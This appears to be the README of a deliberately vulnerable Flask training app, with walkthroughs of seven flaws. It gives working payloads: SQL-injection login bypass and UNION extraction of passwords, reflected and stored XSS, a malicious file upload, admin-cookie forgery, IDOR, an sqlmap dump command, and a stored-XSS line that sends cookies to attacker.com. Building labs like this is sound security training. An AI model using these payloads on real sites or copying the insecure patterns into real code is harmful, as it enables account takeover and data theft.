# 🔒 Security Testing Lab

⚠️ **WARNING: This application is INTENTIONALLY VULNERABLE and should NEVER be deployed to production or exposed to the internet!**

**Security Testing Lab** is a deliberately insecure web application built for educational purposes, penetration testing practice, and security vulnerability demonstrations.

## Purpose

This application contains common web vulnerabilities for learning and testing:

1. **SQL Injection** - Login, registration, search, and profile pages
2. **Reflected XSS** - Search functionality
3. **Stored XSS** - Comments section
4. **HTML Injection** - Comments section
5. **File Upload Vulnerabilities** - No file type validation
6. **Broken Authentication** - Plain text passwords, insecure cookies, no session expiration
7. **Insecure Direct Object Reference (IDOR)** - Profile pages with no authorization

## Installation & Setup

### Step 1: Install Python Dependencies

```bash
pip install -r requirements.txt
```

### Step 2: Initialize the Database

```bash
python init_db.py
```

This creates a SQLite database with sample data:
- **Admin account**: username=`admin`, password=`admin`
- **User account**: username=`user1`, password=`password123`
- Sample products for searching
- Sample comments

### Step 3: Run the Application

```bash
python app.py
```

The application will start on `http://localhost:5000`

## Testing the Vulnerabilities

### 1. SQL Injection

#### Login Bypass
- URL: `http://localhost:5000/login`
- Username: `admin' OR '1'='1`
- Password: `anything`
- This bypasses authentication completely

#### Search SQL Injection
- URL: `http://localhost:5000/search?query=' OR '1'='1`
- Retrieves all products from database

#### Union-based SQL Injection
- URL: `http://localhost:5000/search?query=' UNION SELECT id, username, password, email FROM users--`
- Extracts user data

### 2. Reflected XSS

- URL: `http://localhost:5000/search?query=<script>alert('XSS')</script>`
- URL: `http://localhost:5000/search?query=<img src=x onerror=alert('XSS')>`
- The JavaScript executes immediately in your browser

### 3. Stored XSS (Persistent)

- Navigate to: `http://localhost:5000/comments`
- Post a comment with payload:
  - Name: `Attacker`
  - Comment: `<script>alert('Stored XSS')</script>`
- The script will execute every time someone views the comments page

### 4. HTML Injection

- Navigate to: `http://localhost:5000/comments`
- Post a comment with:
  - Name: `Test`
  - Comment: `<h1>Injected Heading</h1><p style="color:red">Injected HTML</p>`
- Your HTML will be rendered on the page

### 5. File Upload Vulnerability

- Navigate to: `http://localhost:5000/upload`
- Upload malicious files:
  - Create an HTML file with JavaScript: `malicious.html`
    ```html
    <script>alert('Executed from uploaded file')</script>
    ```
  - Upload and access at: `http://localhost:5000/uploads/malicious.html`
  - The file executes in the browser context

### 6. Broken Authentication

#### Plain Text Passwords
- Login as admin/admin
- View profile at: `http://localhost:5000/profile?id=1`
- Password is visible in plain text

#### Cookie Manipulation
- Open browser DevTools (F12)
- Go to Application/Storage → Cookies
- Modify `is_admin` cookie to `1`
- Access: `http://localhost:5000/admin`
- You now have admin access!

### 7. Insecure Direct Object Reference (IDOR)

- Login as any user
- Navigate to: `http://localhost:5000/profile?id=1`
- Change ID to 2, 3, 4, etc.: `http://localhost:5000/profile?id=2`
- You can view ANY user's profile including passwords!

## Attack Scenarios

### Scenario 1: Complete Account Takeover
1. Use SQL Injection on login: `admin' OR '1'='1`
2. Access admin panel via cookie manipulation
3. View all user credentials
4. Use IDOR to access specific user profiles

### Scenario 2: Cross-Site Scripting Attack Chain
1. Post stored XSS in comments: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
2. Wait for other users to view comments
3. Their cookies are sent to your server

### Scenario 3: File Upload + XSS
1. Create HTML file with malicious JavaScript
2. Upload via `/upload`
3. Share link to uploaded file
4. Victim executes your script

## Security Testing Tools

You can use these tools to test the application:

- **SQLMap** - Automated SQL injection testing
- **Burp Suite** - Web vulnerability scanner
- **OWASP ZAP** - Security testing tool
- **Browser DevTools** - Cookie manipulation
- **curl/Postman** - API testing

## Example SQLMap Command

```bash
sqlmap -u "http://localhost:5000/search?query=test" --dbs --dump
```

## Educational Use Only

This application is for:
✅ Learning about web security
✅ Practicing penetration testing
✅ Security training and CTF challenges
✅ Demonstrating vulnerabilities

This application is NOT for:
❌ Production use
❌ Storing real data
❌ Public deployment
❌ Malicious purposes

## 📚 Documentation

For detailed explanations of each vulnerability, exploitation techniques, and prevention methods, see:

**[VULNERABILITIES_GUIDE.md](VULNERABILITIES_GUIDE.md)** - Comprehensive educational guide covering:
- Detailed vulnerability explanations
- Step-by-step exploitation examples
- Real-world attack scenarios
- Prevention and mitigation techniques
- OWASP Top 10 coverage
- Testing tools and resources

## File Structure

```
BugguApp/
├── app.py                      # Main Flask application (vulnerable)
├── init_db.py                  # Database initialization script
├── requirements.txt            # Python dependencies
├── README.md                   # Quick start guide (this file)
├── VULNERABILITIES_GUIDE.md    # Detailed educational documentation
├── vulnerable_app.db           # SQLite database (created after init_db.py)
└── uploads/                    # Uploaded files directory
```

## Stopping the Application

Press `Ctrl+C` in the terminal to stop the Flask server.

## Cleanup

To reset the application:

```bash
# Remove database
rm vulnerable_app.db

# Remove uploaded files
rm -rf uploads/*

# Reinitialize
python init_db.py
```

---

**Remember: This app is intentionally broken. Never use these patterns in real applications!**
